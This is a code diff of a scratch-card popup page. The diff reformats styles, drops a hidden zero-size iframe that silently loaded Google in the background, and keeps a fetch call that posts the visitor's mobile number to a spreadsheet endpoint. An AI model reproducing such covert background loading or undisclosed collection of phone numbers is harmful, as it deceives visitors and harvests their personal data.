@@ -35,9 +35,17 @@
             padding: 20px; 
             box-shadow: 0 7px 25px rgba(0, 0, 0, 0.5); 
         }
-        .popup h1 { font-size: 26px; margin-bottom: 15px; }
-        .popup p { margin-bottom: 15px; }
-        .input-container { position: relative; margin-bottom: 15px; }
+        .popup h1 { 
+            font-size: 26px; 
+            margin-bottom: 15px; 
+        }
+        .popup p { 
+            margin-bottom: 15px; 
+        }
+        .input-container { 
+            position: relative; 
+            margin-bottom: 15px; 
+        }
         .input-container span { 
             position: absolute; 
             top: 50%; 
@@ -162,11 +170,6 @@
         </div>
     </div>
 
-    <!-- Background Website Loader -->
-    <div id="backgroundLoader" style="display: none;">
-        <iframe src="https://example.com" width="0" height="0" frameborder="0"></iframe>
-    </div>
-
     <script>
         const mobileInput = document.getElementById('mobile');
         const scratchBtn = document.getElementById('scratchBtn');
@@ -198,12 +201,15 @@
 
         async function saveMobileToSheet(mobile) {
             try {
-                await fetch(SHEET_URL, {
+                const response = await fetch(SHEET_URL, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
                     body: JSON.stringify({ mobile }),
-                    mode: "no-cors",
+                    mode: "no-cors", // Prevent CORS issues
                 });
+
                 console.log("Mobile number submitted successfully.");
             } catch (error) {
                 console.error("Error saving data:", error);
@@ -211,20 +217,12 @@
             }
         }
 
-        function loadWebsiteInBackground(url) {
-            const iframe = document.createElement('iframe');
-            iframe.src = url;
-            iframe.style.display = 'none';
-            document.getElementById('backgroundLoader').appendChild(iframe);
-        }
-
         scratchBtn.addEventListener("click", () => {
             const mobileValue = mobileInput.value;
             mainPopup.classList.add("hidden");
             scratchCardPopup.classList.remove("hidden");
             initializeScratchCard();
-            saveMobileToSheet(mobileValue);
-            loadWebsiteInBackground("https://www.google.com"); // Load website in the background
+            saveMobileToSheet(mobileValue); // Save the number in the background
         });
 
         function initializeScratchCard() {
